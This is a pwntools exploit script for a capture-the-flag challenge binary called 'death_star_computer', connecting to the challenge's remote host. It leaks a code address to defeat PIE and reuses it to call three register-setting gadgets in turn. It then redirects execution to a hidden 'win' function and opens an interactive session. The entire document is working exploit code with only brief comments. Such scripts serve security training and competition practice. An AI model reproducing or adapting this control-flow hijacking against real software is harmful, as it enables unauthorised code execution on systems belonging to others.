from pwn import *
#io = process("./death_star_computer.bin")
io = remote("spaceheroes-death-star.chals.io", 443, ssl=True, sni="spaceheroes-death-star.chals.io")
# leak pie, setup the registers using gadgets in ignore_me, set win as target, fire, profit

def enterTarget(target):
    io.sendlineafter("-------------------------------","1")
    io.sendlineafter("|CHOOSE A TARGET|",str(target))

def fire():
    io.sendlineafter("-------------------------------","3")

enterTarget(1)
io.sendlineafter("-------------------------------","2")
io.recvuntil("Target Coordinates => ")
leak = int(io.recvline()[:-1])
pieBase = leak - 0x1355

# 0x1527 : mov r13, 0x56 ; ret
# 0x151f : mov r14, 0x4b ; ret
# 0x152f : mov r15, 0x135 ; ret
enterTarget(pieBase+0x1527)
fire()

enterTarget(pieBase+0x151f)
fire()

enterTarget(pieBase+0x152f)
fire()

# 000000000000153a g     F .text  0000000000000046              _Z3winv
enterTarget(pieBase+0x153a)
fire()

io.interactive()
